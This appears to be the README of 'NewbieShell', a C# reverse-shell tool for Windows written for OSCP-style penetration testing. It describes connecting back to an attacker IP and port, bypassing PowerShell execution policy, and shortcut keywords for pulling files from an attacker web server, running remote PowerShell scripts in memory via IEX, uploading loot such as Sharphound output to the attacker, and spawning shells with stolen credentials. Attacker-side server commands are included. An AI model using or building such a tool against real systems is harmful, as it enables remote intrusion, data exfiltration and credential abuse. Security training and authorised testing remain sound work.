# NewbieShell
## Reverse shell for beginners

When preparing for the OSCP certificate, I mostly used Netcat and a msfvenom payload for a connection. The most annoying thing for me was that when downloading and uploading software, it required a very long text. Since I like to program in C#, I thought I would just simplify this for myself. Through this idea the NewbieShell was born. The goal was to execute code with short keywords, like download. This saves the attacker time and nerves. 
Furthermore, as the name "NewbieShell" suggests, this software is also intended for beginners. 

## Usage

There are two ways to use NewbieShell. The simple method in the Console.

```
NewbieShell.exe
```

In this method the program asks for an IP address, port and whether to use cmd.exe or powershell.exe as return.

The second option is to use NewbieShell like Netcat.

```
Newbieshell.exe <ip> <port> <cmd.exe or powershell.exe>
```

Example: NewbieShell.exe 192.168.0.1 80 cmd.exe

If Powershell.exe is executed, then NewbieShell executes the command "-ep bypass" in the background. This sets the ExecutionPolicy to bypass.

### NewbieShell Console
All Windows commands can be inserted normally. For example, if you want to download something from a web server, then you have the possibility to execute a download with so-called keywords. The keyword for download is #D

After entering the keyword, a query comes from the system about which file it is and so on. Further information can be found below in the documentation.

#### Temp Folder

The first time NewbieShell connects, a folder is set up under the path C:\temp. This folder is where all data is stored/downloaded

#### Download - Keyword #D

As already described above, the keyword #D is the download function. NewbieShell specifies that a web server should be running on the attacker's side. The "http.server" based on Python3, is available by default on Kali Linux. With this command a web server can be executed on the attacker machine.

```
python3 -m http.server 80
```

In the next step, the software will ask for the file that should be downloaded.
Because NewbieShell knows the IP address of the attacker. The query for the attacker IP address is omitted.

If the file has been downloaded, it can be found in the C:\temp directory.

#### IEX - Keyword #IEX

The IEX command is often used to execute malware. For example, a .ps1 file is executed without saving the file to the hard disk.
As with the download function, a web server is required. This should be executed on the attacker's computer. 

#### Upload - Keyword #U

I often had the case that I wanted to upload files such as Sharphound files to my attacker PC. I did not always want to use an SMB share. I have thought about whether this is easier. Unfortunately, the upload - function does not work with the standard Python3 "http.server", because this web server does not accept post - function. But there is another webserver which can do this. This can be easily installed with this command on the attacker side.

```
pip3 install uploadserver
```

After the web server or upload server is installed, then it can be run on the attacker machine.

```
python3 - m uploadserver 80
```

For info NewbieShell accurately indicates that the upload server should be installed and running.

NewbieShell requests the full path of the file. After a successful upload, the file should be discoverable on the attacker's site.

#### Impersonation - Keyword #I

If you have found any credentials during the attack, you have the possibility to generate a new shell with these credentials using NewbieShell.
The system will ask for the username, password and domain. If there is no domain, this line can be left blank. 

